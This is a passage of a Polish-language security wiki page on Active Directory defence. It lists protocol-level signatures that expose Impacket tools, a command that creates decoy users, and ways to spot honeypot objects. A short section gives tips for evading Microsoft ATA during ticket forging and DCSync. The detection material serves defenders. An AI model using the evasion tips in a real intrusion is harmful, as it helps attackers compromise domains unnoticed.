Jeśli chcesz wykrywać typowe AD tradecraft, **nie polegaj wyłącznie na artefaktach kontrolowanych przez operatora**, takich jak zmienione nazwy plików binarnych, nazwy usług, tymczasowe pliki batch lub ścieżki wyjściowe. Ustal bazowy sposób, w jaki legalne klienty Windows generują ruch [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI, a następnie szukaj **cech implementacyjnych**, które pozostają nawet po edycji przez operatora plików `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` lub `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Kandydaci o wysokiej pewności, działający samodzielnie** (po zweryfikowaniu względem własnego baseline):
- Uwierzytelnione DCE/RPC z użyciem `auth_context_id = 79231 + ctx_id`
- Padding uwierzytelniania DCE/RPC wypełniony wartością `0xff`
- Bindowania LDAP Kerberos, które umieszczają surowy Kerberos `AP-REQ` bezpośrednio w `mechToken` SPNEGO
- Żądania negocjacji SMB2/3 z wartościami `ClientGuid` wyglądającymi jak ASCII
- WMI `IWbemLevel1Login::NTLMLogin` z użyciem niestandardowej przestrzeni nazw `//./root/cimv2`
- Zahardkodowane wartości nonce Kerberos
- **Lepsze jako cechy korelacji/scoringu**:
- Rzadkie lub zduplikowane listy etype Kerberos, nietypowe/brakujące `PA-DATA` albo kolejność etype w TGS-REQ różniąca się od natywnego Windows
- Wiadomości NTLM Type 1 bez informacji o wersji lub wiadomości Type 3 z pustymi nazwami hostów
- Surowy NTLMSSP przenoszony w DCE/RPC zamiast SPNEGO, brak trailerów weryfikacyjnych DCE/RPC albo niezgodności OID SPNEGO/Kerberos
- Kilka takich cech z tego samego hosta/użytkownika/sesji/przedziału czasowego jest znacznie silniejszym sygnałem niż dowolne pojedyncze słabe pole
- **Używaj jako enrichment, a nie jako samodzielnych alertów**:
- Domyślne nazwy plików, ścieżki wyjściowe, losowe nazwy usług, tymczasowe nazwy batch, domyślne nazwy kont komputerów oraz charakterystyczne dla narzędzi ciągi HTTP/WebDAV/RDP/MSSQL
- Operatorzy mogą je łatwo zmieniać, dlatego najlepiej używać ich do wyjaśniania, dlaczego klaster międzyprotokołowy jest podejrzany
- **Uwagi operacyjne**:
- Niektóre z tych sygnałów wymagają odszyfrowanego ruchu, [parsowania PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW lub widoczności po stronie usługi
- Przed przekształceniem ich w alerty należy zweryfikować je względem klientów Samba/Linux, appliance'ów i starszego oprogramowania
- W miarę zwiększania pewności co do baseline przenoś detekcje z enrichment -> hunting -> alerting

### **Implementowanie technik deception**

- Implementowanie deception obejmuje zastawianie pułapek, takich jak użytkownicy lub komputery-przynęty, z cechami takimi jak hasła, które nie wygasają, lub oznaczenie jako Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi uprawnieniami lub dodawanie ich do grup o wysokich uprawnieniach.<sup>[[2]](#references)</sup>
- Praktyczny przykład obejmuje użycie narzędzi takich jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej informacji o wdrażaniu technik deception znajduje się na stronie [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identyfikowanie deception**

- **Dla obiektów użytkowników**: Podejrzane wskaźniki obejmują nietypowy ObjectSID, rzadkie logowania, daty utworzenia oraz niską liczbę nieudanych prób podania hasła.
- **Wskaźniki ogólne**: Porównanie atrybutów potencjalnych obiektów-przynęt z atrybutami prawdziwych obiektów może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomóc w identyfikowaniu takich deception.

### **Omijanie systemów detekcji**

- **Omijanie detekcji Microsoft ATA**:
- **Enumeracja użytkowników**: Unikanie enumeracji sesji na Domain Controllers w celu zapobiegania detekcji ATA.
- **Impersonacja ticketów**: Używanie kluczy **aes** do tworzenia ticketów pomaga omijać detekcję, ponieważ nie następuje downgrade do NTLM.
- **Ataki DCSync**: Zaleca się wykonywanie ich z systemu, który nie jest Domain Controller, aby uniknąć detekcji ATA, ponieważ bezpośrednie wykonanie z Domain Controller wywoła alerty.

## References

- [1] [A Guide to Attacking Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forging Trusts for Deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [From Domain Admin to Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [A journey into forgotten Null Session and MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

{{#include ../../banners/hacktricks-training.md}}
